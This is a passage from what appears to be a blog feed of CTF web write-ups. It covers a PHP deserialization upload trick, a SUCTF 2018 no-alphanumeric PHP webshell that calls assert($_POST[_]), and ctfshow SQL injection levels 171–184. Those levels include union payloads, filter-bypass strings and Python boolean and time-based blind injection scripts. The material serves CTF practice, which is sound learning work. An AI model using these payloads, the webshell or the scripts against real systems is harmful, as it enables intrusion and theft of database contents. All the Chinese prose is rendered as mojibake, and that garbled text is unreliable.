ã€‚</p><blockquote><p>filename=â€1â€™,â€™1â€™,â€™1â€™,â€™1â€™,0x4f3a363a2268656c706572223a323a7b733a393a22002a00636f6e666967223b733a353a222f666c6167223b733a393a22002a00696676696577223b623a313b7d)#.pngâ€</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210812111351572.png"></p><p>ä¸Šä¼ åå»show.phpæ‰§è¡Œï¼Œå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><blockquote><p>flag{ab9b67fb-c05c-45ce-b223-c9bb1247dc34}</p></blockquote><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><h3 id="æ— å­—æ¯æ•°å­—upload"><a href="#æ— å­—æ¯æ•°å­—upload" class="headerlink" title="æ— å­—æ¯æ•°å­—upload"></a>æ— å­—æ¯æ•°å­—upload</h3><p>æ‰¾äº†æ‰¾å‘ç°åªæœ‰uploadçš„ç‚¹ï¼Œè¿˜æœ‰é»‘åå•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=substr(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹å‘ç°åªç»™äº†ä¸€äº›å­—ç¬¦ï¼Œå­—æ¯å’Œæ•°å­—éƒ½banäº†ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210813182603302.png"></p><p>å¼‚æˆ–ä¹Ÿæ²¡äº†ï¼Œé‚£åªèƒ½å–åäº†ï¼Œè¿™é‡Œç›´æ¥ç»™pocã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=[];</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$__</span>==<span class="variable">$__</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="variable">$__</span>=~(è); <span class="comment">// a</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(åŒ†); <span class="comment">// s</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>].<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(éš); <span class="comment">// e</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(åƒ); <span class="comment">// r</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(è‹¦); <span class="comment">// t</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$____</span>=~(~(_)); <span class="comment">// _</span></span><br><span class="line"><span class="variable">$__</span>=~(è¯—); <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(å°˜); <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(æ¬£); <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>=~(ç«™); <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// assert($_POST[_])</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ååœ¨phpinfoçš„ç¯å¢ƒå˜é‡é‡Œå¯ä»¥çœ‹åˆ°flagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210813190419027.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;BUUOJ-Web WriteUp&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://lucifer-rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
    <category term="BUUOJ" scheme="https://lucifer-rossweisse.github.io/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow webå…¥é—¨ sql</title>
    <link href="https://lucifer-rossweisse.github.io/2021/02/09/web%E5%AD%A6%E4%B9%A0/ctfshow%20SQL/"/>
    <id>https://lucifer-rossweisse.github.io/2021/02/09/web%E5%AD%A6%E4%B9%A0/ctfshow%20SQL/</id>
    <published>2021-02-08T16:58:12.000Z</published>
    <updated>2021-07-23T03:27:15.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-SQL"><a href="#ctfshow-SQL" class="headerlink" title="ctfshow SQL"></a>ctfshow SQL</h1><p>åˆ·ä¸€åˆ·ctfshowçš„sqlé¢˜ï¼Œæå‡ä¸€ä¸‹sqlæ–¹é¢çš„ç¼ºé™·</p><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>è¿›å…¥åé¢˜ç›®ç»™å‡ºäº†sqlæ³¨å…¥çš„è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸‹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 4 %23 # æŸ¥è¯¢åˆ—æ•°</span><br><span class="line">-1&#39; union select 1,2,3 %23 # æŸ¥å›æ˜¾ç‚¹</span><br><span class="line">-1&#39; union select 1,database(),3 %23 # çˆ†åº“å</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 %23 # çˆ†è¡¨å</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;),3 %23 # çˆ†åˆ—å</span><br><span class="line">-1&#39; union select 1,(select group_concat(username,0x7e,password) from ctfshow_user),3 %23 # çˆ†æ•°æ®</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flag</p><blockquote><p>ctfshow{50392f35-7412-4264-833f-ae36542013f0}</p></blockquote><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>è¿›å…¥é¢˜ç›®å°±çœ‹åˆ°ä¸€åªå¯çˆ±çš„å°çŒ«åœ¨æ™ƒï¼Œå°çŒ«å’ªè™½ç„¶å¾ˆå¯çˆ±ï¼Œä½†æ˜¯è¿˜æ˜¯å¾—å…ˆå†™é¢˜</p><p>è¿›åˆ°selectæ¨¡å—çš„æ— è¿‡æ»¤æ³¨å…¥2</p><p>è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œä½†æ˜¯å›æ˜¾ç‚¹å˜ä¸ºäº†ä¸¤ä¸ª</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>è¿™é¢˜ä¹Ÿè·Ÿ171ä¸€æ ·ï¼Œä½†æ˜¯è¿”å›ç»“æœé‚£è¿‡æ»¤äº†flag</p><p>ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦å»æ‰usernameçš„æŸ¥è¯¢å°±å¥½äº†ï¼Œå› ä¸ºflagåœ¨usernameé‡Œ</p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>æµ‹è¯•äº†å‡ ä¸‹å‘ç°æ²¡æ•°æ®ï¼ŒæŠ“åŒ…å‘ç°äº†ä¸€ä¸ªå¥‡æ€ªçš„ç½‘å€</p><p><a href="http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1">http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1</a></p><p>æœ‰å›æ˜¾äº†ï¼Œä½†æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œç”¨ç›²æ³¨æ•´æ•´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user4 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) %23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>è¿™æ¬¡æ²¡å›æ˜¾äº†ï¼Œè¯•è¯•æ—¶é—´ç›²æ³¨</p><p>è¿™é‡Œæ˜¯ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user5 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)%23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url+datasql, timeout=<span class="number">0.5</span>)</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> left != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>è¿™é¢˜ç®€å•çš„è¿‡æ»¤äº†ä¸€ä¸‹å…³é”®å­—ï¼ŒæŠŠselectè¿‡æ»¤äº†ï¼Œä½†æ˜¯æ²¡äº‹</p><p>è¯•è¯•å¤§å†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">999&#39; union Select 1,2,3 %23 # æˆåŠŸå¾—åˆ°å›æ˜¾</span><br><span class="line">999&#39; union Select 1,(Select group_concat(username,0x7e,password) From ctfshow_user),3%23 # çˆ†å‡ºflag</span><br></pre></td></tr></table></figure><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>è¿™é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨/**/ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(username,0x7e,password)&#x2F;**&#x2F;From&#x2F;**&#x2F;ctfshow_user),3%23 # çˆ†å‡ºflag</span><br></pre></td></tr></table></figure><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>è¿‡æ»¤äº†ç©ºæ ¼å’Œ*å·ï¼Œè½¬ç”¨%09ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999&#39;%09union%09Select%091,(Select%09group_concat(username,0x7e,password)%09From%09ctfshow_user),3%23 # çˆ†å‡ºflag</span><br></pre></td></tr></table></figure><p>åé¢å‘ç°ï¼Œå…¶å®è¿˜å¯ä»¥è¿™æ ·å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # éé¢„æœŸè§£</span><br></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>è¿™é¢˜æŠŠ%09ä¹Ÿç»™è¿‡æ»¤äº†ï¼Œä½†æ˜¯è¿˜æœ‰å¤šç§å§¿åŠ¿</p><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>å¯ä»¥ç”¨ä¸Šé¢çš„éé¢„æœŸç›´æ¥ä¸€æŠŠæ¢­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # éé¢„æœŸè§£</span><br></pre></td></tr></table></figure><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>ç”¨%0cç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure><h3 id="è§£æ³•ä¸‰"><a href="#è§£æ³•ä¸‰" class="headerlink" title="è§£æ³•ä¸‰"></a>è§£æ³•ä¸‰</h3><p>ç”¨()ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or(1&#x3D;1)%23</span><br></pre></td></tr></table></figure><h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><p>æŠŠå¤§éƒ¨åˆ†ç©ºæ ¼éƒ½è¿‡æ»¤æ‰äº†ï¼ˆ180è¿˜æŠŠ%23ä¹Ÿè¿‡æ»¤äº†</p><p>è¿™é‡Œé‡‡ç”¨Y4å¸ˆå‚…çš„è§£æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1 # è¾“å…¥è¿›å»ä¹‹å</span><br><span class="line"># sqlè¯·æ±‚è¯­å¥</span><br><span class="line">where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line"># å› ä¸ºandçš„ä¼˜å…ˆçº§æ¯”orå¤§ï¼Œæ‰€ä»¥ç›¸å½“äº</span><br><span class="line">where (username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;) or (id&#x3D;26and&#39;1&#39;&#x3D;&#39;1&#39;)</span><br><span class="line"># å› ä¸ºorå·¦è¾¹ä¸ºfalseï¼Œä½†æ˜¯å³è¾¹ä¸ºtrueï¼Œæ‰€ä»¥whereçš„æ¡ä»¶ä¸ºtrue</span><br><span class="line"># tipsï¼šid&#x3D;26æ­£å¥½è¿˜æ˜¯flagçš„å…ƒç»„ï¼Œå®åœ¨æ˜¯å¤ªå¥³å°‘äº†</span><br></pre></td></tr></table></figure><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>è¾“å…¥ctfshow_userå‘ç°æœ‰å›æ˜¾ï¼Œè€Œä¸”whereå¯æ§</p><p>æ•´ä¸ªç›²æ³¨è„šæœ¬è·‘å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="subst">&#123;result+j&#125;</span>%&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>è¿™é¢˜è¿‡æ»¤äº†æ›´å¤šçš„ä¸œè¥¿ï¼ŒæŠŠwhereä¹Ÿè¿‡æ»¤äº†ï¼Œä½†æ˜¯æŠŠç©ºæ ¼æ”¾å‡ºæ¥äº†</p><p>è¿™é‡ŒæŸ¥åˆ°äº†ä¸¤ç§è§£æ³•</p><h3 id="è§£æ³•ä¸€-1"><a href="#è§£æ³•ä¸€-1" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>è§£æ³•ä¸€æ˜¯å‚ç…§Y4å¸ˆå‚…çš„ç”¨right byè¿›è¡ŒæŸ¥è¯¢</p><p>è¿™é‡Œæ˜¯ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h3 id="è§£æ³•äºŒ-1"><a href="#è§£æ³•äºŒ-1" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>å› ä¸ºcountæ˜¯èšåˆå‡½æ•°ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨group byï¼Œhavingæ¥æŸ¥è¯¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span 